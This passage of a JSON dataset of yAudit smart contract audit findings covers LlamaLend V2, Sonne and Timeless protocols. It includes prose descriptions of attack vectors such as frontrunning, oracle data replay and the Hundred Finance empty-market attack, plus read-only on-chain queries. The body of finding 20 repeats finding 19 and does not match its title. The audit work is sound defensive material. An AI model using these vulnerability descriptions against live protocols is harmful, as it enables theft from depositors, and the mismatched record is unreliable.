Informational", "Difficulty: n/a"]}, {"title": "49. safeApprove is deprecated", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "This function is deprecated because it can be used to manipulate a user's allowances using specific transaction ordering.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "50. Swapper repo foundry coverage failing", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "While increasing code coverage does not necessarily reduce the risk of security issues, it is generally a good idea to improve code coverage for projects. Running foundry coverage in the swapper repo returns a CompilerError: Stack too deep when compiling inline assembly: Variable value0 is 1 slot(s) too deep inside the stack. error. This implies that code coverage is not being monitored or improved for the swapper issue.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "51. StETHERC4626.t.sol test failing", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "This issue is caused by the mintUnderlying call on line 188, which mints 1e18+2 of the underlying token for alice. 1e18 of these tokens are deposited to the vault on line 201, leaving behind 2 underlying tokens in alice's account when the following assertion is made on line 205.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "1. createPool() always reverts", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md", "body": "LLamalendFactory.createPool() sends ether to the LendingPool contract: payable(address(pool)).sendValue(msg.value); Since the LendingPool contract doesn't have a receive() function, this transfer reverts, in turn reverting createPool().", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "2. Frontrunning borrow changes borrower's interest rate", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md", "body": "The LlamaLend protocol calculates the interest rate of a loan in calculateInterest(). The rate curve is a linear 1-piece curve (unlike protocols like Aave that use a 2-part curve, with a steeper slope after a certain amount of borrowing). The interest rate for a loan is fixed, not variable like many other lending protocols where the rate depends on the total amount borrowed. To determine the fixed rate, LlamaLend uses the midpoint between the current borrowed amount of the new borrowed amount after the borrow action is complete. This calculation is in line 98. This introduces dependency on the amount borrowed at the time of the loan, or totalBorrowed. Frontrunning a borrow with another borrow can change the value of totalBorrowed.", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "3. No support for cryptopunks", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md", "body": "Cryptopunks are at the core of the NFT ecosystem. As one of the first NFTs, it embodies the culture of NFT marketplaces. But cryptopunks does not adhere to the ERC721 standard, that limits the contract ability to accept cryptopunks as collateral.", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "4. baseURI can be made a modifiable state variable", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md", "body": "LendingPool.tokenURI() uses this baseURI: string private constant baseURI = \"https://nft.llamalend.com/nft2/\"; This is a constant variable and if access to https://nft.llamalend.com/nft2/ is lost, tokenURI() will start returning an inaccessible URI.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "5. Consider removing LlamaLendFactory.receive()", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md", "body": "There is no need to send ether to LlamaLendFactory contract explicitly, so receive() can be removed, but even if someone sends ETH by mistake to the contract address, any one can extract them by passing empty data to repay.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "6. calculateInterest() does not account for pending interest payments", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md", "body": "When a pool has an outstanding borrowed amount, there is a corresponding amount of interest that is expected to be paid in the future. When the interest is calculated for new loans, the total value of the pool is calculated as the current pool balance plus the amount of value borrowed, which is the denominator in the calculation of variableRate. This total value does not consider the pending interest payments that are due. The result is that the total pool balance is slightly underestimated. While the existing approach of ignoring future interest payments until they are paid may have some benefit, it creates a discontinuity where the total assets held by the pool before and after a user calls repay() results in an immediate increase in pool assets.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "7. Risk of bad debt", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md", "body": "The README in the LlamaLend repository has this line in the \"Risks for LPs\" section You are selling put options on NFTs, if NFT price drops >66% before some loan expires, user will likely not repay and you'll get the NFT at a loss. Lending protocols like Aave and Compound have liquidation policies that limit the amount of bad debt that can accumulate in the protocol. This is no such protection in LlamaLend, so liquidation is only possible after loan.deadline regardless of how much bad debt accumulates. The LlamaLend README suggest a maxLoanLength value of 2 weeks will be used, but this is not hardcoded into the contracts, meaning that a longer deadline could increase the risk of bad debt and loss of value for the lender.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "8. Oracle data replay attack", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md", "body": "There is no requirement in checkOracle() that only the latest oracle data can be used. Instead, there is a deadline and any oracle data in the timeframe allowed by deadline is accepted. A user can look at the data from the last 20 minutes and choose the oracle data with a price that is most beneficial to them. This lets users \"turn back to clock\" if they don't like the latest data that the oracle is returning. This means that the oracle must be sure not to return a zero value or underestimated value for the NFT floor price in any edge case scenario, such as before the NFT floor price data is available. For comparison, when Chainlink oracle data is used, it is normally recommended to use only the latest round of oracle data, which removes the ability for a user to choose which datapoint among recent data to use.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "9. NFT can get locked in contract if from is a smart contract", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md", "body": "User will receive the collateral NFT when repay() is called. However, if from is a contract address that does not support ERC721, the collateral NFT can be frozen in the contract. As per EIP-721: \"A wallet/broker/auction application MUST implement the wallet interface if it will accept safe transfers.\" function _repay(Loan calldata loan, address from) internal returns (uint256) { ... IERC721(loan.nftContract).transferFrom(address(this), from, loan.nft); ... }", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "10. Use custom errors", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md", "body": "Custom errors are more gas efficient than error strings.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "11. Variables are auto-initialized to 0", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md", "body": "LendingPool.sol#L277-L279 creates an else clause to assign 0 to a return value which is already 0: } else { lateFees = 0; }", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "12. Extra event is emitted by _burnWithoutBalanceChanges()", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md", "body": "In a normal _burn() function, only a Transfer event is emitted. _burnWithoutBalanceChanges() emits 2 events: Transfer and Approval. The reason being it calls _approve() to clear approval, but _burn() function just deletes _tokenApprovals mapping.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "13. Use unchecked if no underflow risk", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md", "body": "Because lastUpdateDailyBorrows is only modified by setting the variable equal to block.timestamp, block.timestamp - lastUpdateDailyBorrows can never underflow. This line and this line can be unchecked. The same logic applies to loan.startTime so this line can be unchecked.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "14. factory can be marked as immutable", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md", "body": "Since there is no function in the contract that updates the factory variable address, it can be marked as immutable.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "15. Foundry and hardhat tests not working", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md", "body": "Hardhat and Foundry tests are not working as they refer to non-existent contracts and variables, or call functions with different number of arguments.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "16. _burnWithoutBalanceChanges() shadows owner", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md", "body": "The second argument in _burnWithoutBalanceChanges(tokenId, owner) shadows the global variable owner.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "17. Consider allowing anyone to repay any loan", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md", "body": "LendingPool.sol#L203, LendingPool.sol#L169", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "18. Update OpenZeppelin dependencies", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md", "body": "The package.json file shows a dependency of openzeppelin/contracts v4.2.0 and openzeppelin/contracts-upgradeable v4.8.0-rc1. All dependencies should be updated to the latest version available.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "19. Flashloans are free", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md", "body": "The interest due on a loan is calculated in _repay() and infoToRepayLoan(). The interest due for a flashloan is zero, meaning there is no fee for this borrowing operation. Whether this is intentional is unclear.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "20. Interest rate \"renegotiation\" after a repayment", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md", "body": "The interest due on a loan is calculated in _repay() and infoToRepayLoan(). The interest due for a flashloan is zero, meaning there is no fee for this borrowing operation. Whether this is intentional is unclear.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "21. Inaccurate comment", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md", "body": "The word overflow in this comment that reads \"overflow checks implictly check that amount is enough\" should be changed underflow.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "22. Align _burnWithoutBalanceChanges() with _burn()", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md", "body": "Although it does not change the end result, the following change in _burnWithoutBalanceChanges() can be made to use the same approach as _burn() - _approve(address(0), tokenId); + delete _tokenApprovals[tokenId];", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "23. Missing events for critical operations", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md", "body": "Without events, users and blockchain-monitoring systems cannot easily detect suspicious behavior. Ideally, the following critical operations should trigger events: withdraw() setMaxDailyBorrows() setOracle() emergencyShutdown() doEffectiveAltruism()", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "24. Revert operation performed without proper error message", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-LlamaLendV2.md", "body": "For ex: In function borrow() it checks that current interest rate should be less than maximumInterestRate, but it does not revert with error message, which can be confusing to use, as error message helps to understand the reason why transaction failed. function borrow() { ... require(interest <= maxInterest); ... }", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "1. Sonne market parameters have a high risk profile", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "In summary, the collateral limits set by Sonne are unusually high in certain markets. Additionally, the overall amount of borrowed assets in Sonne compared to the total assets deposited is also very high. The combination of these factors indicates that Sonne is at risk of collecting bad debt and may not be in a position to pay off this bad debt, which could permanently impact the protocol's reputation. For a first data point, Sonne collateral parameters can be compared to Compound Finance v2, Aave v2 Ethereum, and Aave v3 Optimism market parameters. The table below shows the collateral and reserve parameters for the different underlying assets. | TOKEN | Sonne Collateral Factor | Compound Collateral Factor | Aave v2 Collateral Factor | Aave v3 Optimism Collateral Factor | Sonne Reserve Factor | Compound Reserve Factor | Aave v2 Reserve Factor | Aave v3 Optimism Reserve Factor | | ------ | ----------------------- | -------------------------- | ------------------------- | ---------------------------------- | -------------------- | ----------------------- | ---------------------- | ------------------------------- | | OP | 65% | | | 30.00% | 20% | | | | | USDC | 90% | 85.50% | 80.00% | 80.00% | 10% | 7.50% | 10.00% | 10.00% | | USDT | 90% | 0.00% | 0.00% | 75.00% | 10% | 7.50% | 10.00% | 10.00% | | DAI | 90% | 83.50% | 75.00% | 78.00% | 10% | 15.00% | 10.00% | 10.00% | | sUSD | 60% | | 0.00% | 60.00% | 20% | | 20.00% | | | wETH | 75% | 82.50% | 82.50% | 80.00% | 15% | 20.00% | 15.00% | 15.00% | | SNX | 45% | | 46.00% | | 27% | | 35.00% | | | wBTC | 70% | 70.00% | 72.00% | 73.00% | 20% | 20.00% | 20.00% | 20.00% | | LUSD | 60% | | 0.00% | 0.00% | 20% | | 10.00% | 10.00% | | wstETH | 60% | | 72.00% | 70.00% | 18% | | | 15.00% | Some of the most obvious cases where the Sonne choices differ from other protocols include: 90% USDT collateral factor (compared to 0%) 60% sUSD and LUSD collateral factors (compared to 0%) 75% WETH collateral factor (compared to 80%-82.5%) Aave and Compound have undergone extensive risk analysis as evidenced by their dashboards on Gauntlet's website (1, 2), Gauntlet risk assessment reports (1, 2), and regular governance proposals that modify the risk parameters according to market conditions (1, 2). Aave even disabled borrowing on many tokens in AIP-125 in Nov 2022 after an attack on the protocol caused an accumulation of bad debt. Some of the tokens that had borrowing disabled, including SNX (which exists on Sonne), have not yet reenabled borrowing. While Euler Finance decided to allow borrowing against USDT collateral, it is unclear if Euler Finance has undergone the same level of extensive risk modelling that Compound and Aave have. Comptroller has a hardcoded 90% collateralization factor limit, and because the liquidationIncentiveMantissa is 108%, this means that there is less than a 3% margin in price movement (100% - (108% * 90%) = 2.8%) for some markets before a partial liquidation of a position will push the entire position towards liquidation, as outlined by the \"Counterproductive Incentives\" high finding in this OpenZeppelin report. A second data point can be found by comparing the amount of assets lent and borrowed between different lending protocols. A specific focus was placed on comparing Sonne with other Compound forks (Venus, Tectonic, Benqi, Flux) for a more equal comparison. Note that Venus also has a Gauntlet dashboard. The results below show that Sonne is allowing a much higher amount of borrowing than other lending protocols, which means Sonne is at higher risk of accumulating bad debt than other lending protocols. The reason behind such high borrowing might be the added SONNE token incentives, but the specific borrowing interest rate curves may be another reason behind such high borrowing. | Protocol | Total assets ($M) | Borrowed ($M) | Borrowed percentage | | ---------------- | ----------------- | ------------- | ------------------- | | Sonne | 85 | 56 | 65.90% | | Compound v2 | 1770 | 539 | 30.50% | | Aave v2 Ethereum | 5130 | 1670 | 32.60% | | Aave v3 Optimism | 94 | 35 | 37.20% | | Venus | 1219 | 430 | 35.20% | | Tectonic | 194 | 69 | 35.60% | | Benqi | 151 | 36 | 23.80% | | Flux | 60 | 23 | 38.00% | A final data point that would be helpful to understand the risk for the Sonne protocol is a dashboard that shows liquidations or bad debt in Sonne. Sonne is not listed in the Risk DAO bad debt dashboard, but working with this team to add Sonne would be a good step forward. Creating a Dune dashboard for liquidations and accounts at risk of liquidation would also help. The very high borrowing on Sonne relative to underlying collateral indicates that users are taking higher risk positions in the protocol than other lending protocols. Monitoring should be in place to understand if bad debt is accumulating, as it did in Aave in November 2022, so that governance action can be taken to adjust the protocol parameters as needed. The combination of the above factors and the lack of any borrow cap means that the risk of a bank run on Sonne is higher than protocols with less risky parameters. There are at least two different ways that a bank run could happen. One is the case where a market is at a high utilization rate, say near 90% utilization like the soOP market currently is. This means that if a whale who has deposited into the soOP pool plans to withdraw 10% of the total supplied assets, the soOP market will reach 100% utilization ratio. When a market is at 100% utilization ratio, there are no more assets that can be withdrawn from the market, because the market physically does not hold any of these assets. This means that some users will not be able to withdraw their assets in this case. The second scenario where a bank run could happen is if bad debt accumulates in the market. The early users to withdraw will be able to withdraw their funds without any problem, but the late depositors will not. The result is that the late or last users to withdraw their assets will receive 100% of the impact of bad debt accumulation.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "2. EOA admins control staking rewards", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "The address 0xFb59Ce8986943163F14C590755b29dB2998F2322 is the owner of uSONNE and sSONNE contracts and it is an EOA. This can be confirmed by opening etherscan or querying the contracts directly: cast call 0x41279e29586eb20f9a4f65e031af09fced171166 \"owner()(address)\" --rpc-url https://mainnet.optimism.io cast call 0xdc05d85069dc4aba65954008ff99f2d73ff12618 \"owner()(address)\" --rpc-url https://mainnet.optimism.io This same EOA that is the owner of uSONNE and sSONNE is the admin address for Sonne LiquidityGenerator, which was out of scope of this review. Another role of this EOA is to deploy contracts, including the proxy and logic contract for the Unitroller in the Sonne lending protocol. Another EOA address, 0x201ECB1C439F92aFd5df5d399e195F73b01bB0F3, plays a key role in manually transferring rewards from Velodrome to the uSONNE and sSONNE contracts by calling addReward(). The same EOA is stored as reservesManager in Sonne LiquidityGenerator, which was a contract outside the scope of this review. cast call 0x17063Ad4e83B0aBA4ca0F3fC3a9794E807A00ED7 \"reservesManager()(address)\" --rpc-url https://mainnet.optimism.io EOAs should not play key roles in value transfer operations in a DeFi protocol. There is no way to trust that the EOA is going to act as expected, and without context there is no way to determine that this EOA will not end up rugging depositors of their rewards. Fortunately, in the case of uSONNE and sSONNE, the 0x201ECB1C439F92aFd5df5d399e195F73b01bB0F3 EOA does not have access to the underlying SONNE tokens deposited into the staking contracts, and only has control over future rewards that SONNE generates. But using an EOA for key operations increases the risk of loss of funds due to private key exposure. A multisig would mitigate the risk of this single point of failure.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "3. EOA swapped staked token rewards to ETH for gas", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "The EOA 0x201ECB1C439F92aFd5df5d399e195F73b01bB0F3 plays a key role in manually transferring rewards from Velodrome to the uSONNE and sSONNE contracts by calling addReward(). This same EOA converted some rewards to ETH to pay for the gas consumed in the EOA transactions. This process of taking some staking rewards for ETH is not documented anywhere. In fact, this process contradicts the staking documentation which states that users will get 100% of staking rewards: Stakers will get 80% of the protocol revenue and 80% of VELO rewards for the first 3 months. After team tokens start to get unlocked, stakers will start to get 100% of the protocol revenue. Because the EOA is taking some of these rewards for gas, users are not getting 100% of staking rewards. In fact, there is no explanation for how many reward tokens are spent on gas, so users cannot know what percentage of staking rewards they receive. At the time of this review, 27% of total SONNE is staked in uSONNE or sSONNE contracts, which means over 25% of all SONNE tokens are indirectly impacted by this finding.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "4. Unclear protection against Hundred Finance attack vector", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "The Hundred Finance hack was largely caused by an empty WBTC market. The other requirements for this attack vector are that the market has a non-zero collateral factor (to allow borrowing against this token as collateral) and a totalSupply of the cToken of zero. The result of this is a scenario similar to ERC4626 share price manipulation for the first deposit, with a large donation to skew share price. There is no evidence that Sonne has a clear and consistent mitigation to this attack vector. One of the more recently created Sonne markets, sowstETH, had a 1 day period between the creation of the market on February 19 and the first deposit on February 20. The same pattern is seen in the soLUSD and soWBTC markets, with the soLUSD market created on February 2 and the first deposit on February 3 and the soWBTC market created on December 3 and the first deposit on December 4. The markets were initialized with a non-zero collateral factor, but the collateral factor was raised above 0 before the first deposit in all three of these cases, meaning there was a point in time when the protocol was likely vulnerable to the same attack as Hundred Finance. For example: soWBTC market is deployed at 0x33865E09A572d4F1CC4d75Afc9ABcc5D3d4d867D. soWBTC market was deployed in block 45086893. Collateral factor in this block and soon after is zero, which is good, because assets deposited immediately cannot be borrowed against. cast call 0x60CF091cD3f50420d50fD7f707414d0DF4751C58 \"markets(address)(bool,uint256,bool)\" 0x33865E09A572d4F1CC4d75Afc9ABcc5D3d4d867D --block 45086893 --rpc-url https://mainnet.optimism.io First deposit into soWBTC happened in block 45448745. But in the block before it, we can see the collateralization factor was already non-zero and was set to 70%: cast call 0x60CF091cD3f50420d50fD7f707414d0DF4751C58 \"markets(address)(bool,uint256,bool)\" 0x33865E09A572d4F1CC4d75Afc9ABcc5D3d4d867D --block 45448744 --rpc-url https://mainnet.optimism.io For further confirmation that this is the correct block to examine, the blockchain data confirms that the totalSupply of soWBTC in the block before the first deposit was zero, and then was non-zero in the following block. Before: cast call 0x33865E09A572d4F1CC4d75Afc9ABcc5D3d4d867D \"totalSupply()\" --block 45448744 --rpc-url https://mainnet.optimism.io After: cast call 0x33865E09A572d4F1CC4d75Afc9ABcc5D3d4d867D \"totalSupply()\" --block 45448745 --rpc-url https://mainnet.optimism.io In fact, after doing a search to find when the collateralization factor changed, it is revealed that the collateralization factor was changed in block 45448654. The before and after can be compared with: Before: cast call 0x60CF091cD3f50420d50fD7f707414d0DF4751C58 \"markets(address)(bool,uint256,bool)\" 0x33865E09A572d4F1CC4d75Afc9ABcc5D3d4d867D --rpc-url https://mainnet.optimism.io --block 45448653 After: cast call 0x60CF091cD3f50420d50fD7f707414d0DF4751C58 \"markets(address)(bool,uint256,bool)\" 0x33865E09A572d4F1CC4d75Afc9ABcc5D3d4d867D --rpc-url https://mainnet.optimism.io --block 45448654 There is no script in the deploy directory for deploying a new market, which is another data point that there is no consistent documented process to deploying new markets in a way that mitigates this attack vector.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "5. No sequencer uptime check before querying Chainlink data on L2", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "If a transaction is created on an L2 rollup while the sequencer is down, the transaction would be added to a queue. Because the transaction timestamp is the time when the transaction was queued, by the time the sequencer comes back online to process the queue, the price data could be outdated.", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "6. Poor choice of interest rate models in Sonne", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "Every cToken has a separate interest rate model contract. This is true even when the cTokens have the exact same interest rate borrowing and lending curves. Some examples are shown below. | cToken | Interest Rate Model Contract | | ------ | ------------------------------------------ | | cUSDC | 0xD8EC56013EA119E7181d231E5048f90fBbe753c0 | | cDAI | 0xFB564da37B41b2F6B6EDcc3e56FbF523bD9F2012 | | cETH | 0xF9583618169920c544Ec89795a346F487cB5a227 | In contrast, Sonne is using the same interest rate model contract for many different tokens. The results for all soTokens are shown below. The interest rate model curve for WETH and OP is the same as the interest rate model for the stablecoins that aim to maintain a peg to USD. | soToken | Interest Rate Model Contract | | -------- | ------------------------------------------ | | soWETH | 0xbbbd75383f6A61d5EB5b43e94E6372Df6F7f13c6 | | soDAI | 0xbbbd75383f6A61d5EB5b43e94E6372Df6F7f13c6 | | soUSDC | 0xbbbd75383f6A61d5EB5b43e94E6372Df6F7f13c6 | | soUSDT | 0xbbbd75383f6A61d5EB5b43e94E6372Df6F7f13c6 | | soOP | 0xbbbd75383f6A61d5EB5b43e94E6372Df6F7f13c6 | | soSUSD | 0xbbbd75383f6A61d5EB5b43e94E6372Df6F7f13c6 | | soLUSD | 0xbbbd75383f6A61d5EB5b43e94E6372Df6F7f13c6 | | soWBTC | 0x3F6fB832279AC7db0B4F92b79cBB8Df03702631e | | sowstETH | 0x3F6fB832279AC7db0B4F92b79cBB8Df03702631e | | soSNX | 0x7320bD5fA56F8a7Ea959a425F0C0b8cAc56F741E | One of the side effects of the Sonne interest rate model choices is that the rate curve is less steep for tokens with more volatile prices. In order to minimize the risk of bad debt, there should be incentives to avoid excessive borrowing of risky assets. Specifically, WETH and OP are using the same interest rate model curve as stablecoins that should remain pegged to USD. Using a curve with less slope for volatile assets means that borrowing that asset is less expensive, and making it cheaper to borrow volatile assets increases the risk of bad debt accumulating. The table below compares Compound cToken parameters to Sonne soTokens. | Token | multiplierPerSecond | jumpMultiplierPerSecond | baseRatePerSecond | | ------ | ------------------- | ----------------------- | ----------------- | | cUSDC | 1585489599 | 34563673262 | 0 | | soUSDC | 1981861998 | 43283866057 | 0 | | cETH | 7134703196 | 1553779807204 | 634195839 | | soWETH | 1981861998 | 43283866057 | 0 | | cwBTC | 7134703196 | 31709791983 | 634195839 | | sowBTC | 8918378995 | 39637239979 | 634195839 | Not surprisingly, the largest discrepancy is in WETH, because as mentioned above, soWETH is using the same slope parameters as stablecoins. The soWETH multiplierPerSecond slope is 27.7% of the slope value that Compound uses, and the jumpMultiplierPerSecond slope is only 2.8% of the value chosen by Compound. Or for a different comparison, the cWETH slope after the kink is 218 times the slope before the kink. For soWETH, the slope only increases 22 times after the kink. This means that the Compound Finance market is providing a strong disincentive to borrow beyond the kink for the WETH market than Sonne, most likely to reduce the risk of bad debt. If Compound v2 had a market for OP tokens, the same result would almost certainly exist because soOP is using the same interest rate model as stablecoins, just like soWETH. Finally, while it is true that _setInterestRateModel() in the cToken contract can be used to set a new interest rate model contract, the admin that is able to trigger this change is the Timelock Controller at 0x37ff10390f22fabdc2137e428a6e6965960d60b6, which means that a minimum 48 hour delay must take place before the change can be implemented.", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "7. Sonne interest rate model math error", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "The only non-stablecoin asset in Sonne that is found in Compound Finance with an interest rate model that is almost the same is WBTC. However, Sonne does not properly imitate the WBTC curve from Compound Finance. Consider these example values for a utilization value of 80%. cash: 20000000000000 borrows: 80000000000000 reserves: 0 reserveMantissa: 200000000000000000 Entering these values into getBorrowRate and getSupplyRate in etherscan for intrest rate contract defined in cWBTC, the resulting values are 95129375951 and 60882800608 respectively. After multiplying this rate-per-block by the blocks-per-year value of 2628000, we find the borrow rate is 25% and the supply rate is 16%. Meanwhile, entering these values into etherscan for soWBTC returns 7768899035 for getBorrowRate and 4972095382 for getSupplyRate. After multiplying this rate-per-second by the seconds-per-year value of 31536000, we find the borrow rate is 24.5% and the supply rate is 15.7%. This error may be partially caused by the baseRatePerBlock value chosen for soWBTC. The Compound value for baseRatePerBlock is 9512937595 and the soWBTC value is 9512937595 / 15 = 634195839. However, a soWBTC value assuming 12 second blocks instead of 15 second blocks may improve alignment to Compound Finance's cWBTC curve. Be aware that the Compound UI is inaccurate for the cWBTC curve as detailed in this open issue for the Compound Finance frontend. When hovering over the 80% utilization in the Compound Finance UI, the UI suggests a borrow rate of 24.5% and a supply rate of 18.13%. Therefore, the UI curves do not match the on-chain cWBTC deployment. Additionally, Sonne uses the same value for constant borrowRateMaxMantissa as Compound but in the comment it is stated that borrow rate value is applied per block. This means that the value should be 12 times lower on Optimism. Another Compound fork on Optimism, Hundred Finance, uses the correct value 0.00004e16.", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "8. No Borrow Caps set", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "In November 2022, a widely publicized CRV short selling event aimed at liquidating certain Aave borrowers. Compound Finance took action after this event and made significant changes to their borrow cap approach (1, 2). The result is that Compound Finance has a borrow cap set on every market except for USDC, DAI, and USDT. The borrow caps that are set on markets are set to values that are less than the assets supplied. This means that even though the interest rate curve for borrowing could work up to 100% supplied assets, the borrow cap keeps the maximum amount that can be borrowed significantly lower. Aave also has non-zero borrow caps, although Aave v3 on mainnet Ethereum has higher borrow caps for many assets relative to the amount deposited. Although the explanation in the proposal for reducing the borrow caps was \"insolvency risk from liquidation cascades\" and \"risk of high utilization\", setting proper borrow cap values may also provide some protection in cases like the Venus protocol LUNA fallout (Venus is a Compound fork), because a borrow cap below the value of assets deposited to the protocol would prevent all the assets from the protocol from being borrowed if a Chainlink oracle failed.", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "9. Reserves stored in Sonne adds currency risk", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "When comparing Sonne and Compound Finance on-chain data, it is obvious that there is a large difference in the amount of reserves stored in each protocol. In Compound's cUSDC market, the value of totalReserves is over $13 million. These tokens are owned and stored by the cUSDC contract. In comparison, the Sonne soUSDC market has a totalReserves value of under $1000. The reason that soUSDC has such a low totalReserves value is because the reserves are periodically withdrawn by the admin in transactions such as 0xed3ee0eb900779a6c82d474fc12697bb6cc55372960c775a22c42e4931a7d922. The value flow of the reserves in Sonne is as follows: Reserve tokens accumulate in soToken market contract Reserve tokens are withdrawn by EOA admin EOA admin swaps reserve tokens for USDC using Velodrome pool (potentially has 2% slippage) EOA admin swaps USDC for SONNE tokens (potentially 2% slippage, plus the market price is moved because the USDC/Sonne pool has low liquidity) EOA deposits SONNE tokens into sSONNE, where it sits in the sSONNE contract and collect Velodrome rewards At a minimum, storing the value of the reserves tokens in SONNE introduces currency risk. If bad debt accumulates in a token that is not correlated or pegged to SONNE token value, there is a risk that the value of the reserves could drop in USD terms while the bad debt amount increases in USD terms, making it impossible for the Sonne multisig or admins to pay off the debt. For a specific example, if Sonne collects $1000 in bad debt denominated in USDC and has $5000 of reserves value that was converted to SONNE, then if the SONNE token drops in price more than 80% compared to when the USDC was converted to SONNE, the protocol will not have enough reserves to pay off the bad debt. It is generally a good practice for DAOs or protocols to diversify their treasury holdings. If Sonne holds the original underlying assets instead of converting these assets to Sonne, it demonstrates that Sonne holds real value uncorrelated to the SONNE token. The current approach converts these underlying into SONNE with the goal of propping up the SONNE token price by funding the Velodrome USDC/SONNE market, but it reduces the actual value owned by SONNE in non-SONNE tokens. A secondary risk that is introduced with the swapping of reserve funds is the total losses due to the swaps. Sonne may be losing 5% of total reserve value by swapping the underlying reserve tokens into SONNE because the default slippage on Velodrome is 2%. Two swaps in Velodrome means around 4% of value can be lost, and as highlighted in a separate low findings, the SONNE/USDC market has low liquidity and large swaps can move the market price. If SONNE tokens need to converted back to other tokens to pay off debt, then the overall losses due to slippage could be 7% or higher. This means that the reserves collected by the protocol over time does not match the actual value that could pay off bad debt.", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "10. No Chainlink staleness check in _getLatestPrice()", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md", "body": "The Chainlink latestRoundData() function returns price data along with the roundId and timestamp of the data. If the data is stale, it should be discarded. Otherwise the protocol will trust outdated data that could lead to a loss of value from using an inaccurate exchange rate. Chainlink docs recommend 